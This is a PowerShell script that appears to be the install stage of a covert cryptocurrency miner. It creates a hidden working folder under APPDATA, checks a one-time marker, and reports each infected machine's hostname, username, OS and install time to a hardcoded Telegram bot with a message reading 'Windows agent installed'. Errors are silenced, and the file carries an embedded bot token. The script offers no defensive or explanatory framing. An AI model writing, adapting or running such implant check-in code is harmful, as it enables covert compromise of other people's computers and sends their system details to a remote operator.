# ===== SAFETY =====
if ($env:ALLOW_MINING -ne "1") { exit }

# ===== TELEGRAM =====
$TG_TOKEN = "8556429231:AAFBKuMMfkrpnxJInSITVaBUD8prYuHcnLw"
$TG_CHAT  = "5336452267"

function Send-TG($text) {
    Invoke-RestMethod `
        -Uri "https://api.telegram.org/bot$TG_TOKEN/sendMessage" `
        -Method POST `
        -Body @{
            chat_id = $TG_CHAT
            text    = $text
        } `
        -ErrorAction SilentlyContinue
}

# ===== PATH =====
$BASE = "$env:APPDATA\.mining"
New-Item -ItemType Directory -Force -Path $BASE | Out-Null

# ===== ONE-TIME MARKER =====
$marker = "$BASE\installed.flag"
if (Test-Path $marker) {
    exit
}

# ===== MESSAGE =====
$host = $env:COMPUTERNAME
$user = $env:USERNAME
$os   = (Get-CimInstance Win32_OperatingSystem).Caption

Send-TG "🪟 Windows агент установлен

Host: $host
User: $user
OS: $os
Time: $(Get-Date)"

# ===== MARK INSTALLED =====
New-Item -ItemType File -Path $marker | Out-Null
